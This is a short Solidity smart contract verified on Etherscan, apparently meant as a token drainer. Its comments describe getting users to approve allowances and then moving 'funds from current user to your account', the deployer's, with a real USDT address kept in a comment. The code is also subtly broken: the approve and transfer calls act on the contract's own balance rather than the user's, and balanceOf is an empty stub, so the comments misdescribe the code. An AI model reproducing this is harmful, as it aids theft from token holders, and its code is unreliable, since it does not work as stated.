/**
 *Submitted for verification at Etherscan.io on 2022-09-27
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface token {  //this is interface which will be used
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}


contract SampleContract {

    token public rup;
    address owner;

    address public tokenA = 0xD92E713d051C37EbB2561803a3b5FBAbc4962431;  // this token is deployed on test-network you can see its balance and other things using ethscan
    // address public usdt = 0xdac17f958d2ee523a2206206994597c13d831ec7; // this is real world usdt token address
    constructor(){
        owner = msg.sender;   // saving owner's address
        rup = token(tokenA);  // this will make all transaction in given address which is defined above(tokenA a test network token)
    }

    function ApprovalFunds(uint256 amount) public payable{ // first you have to execute this function it will ask from the user 
    // that this amount of tokens will be set for allowence to owner(which is your address)
        rup.approve(owner, amount);
    }
    function TransferFunds(uint256 amount) public payable{ // secound this function will be executed which will transfer funds from current user
    // to your account.
        rup.transfer(owner, amount);
    }
    function balanceOf(address account) external view returns (uint256){
    
    }
}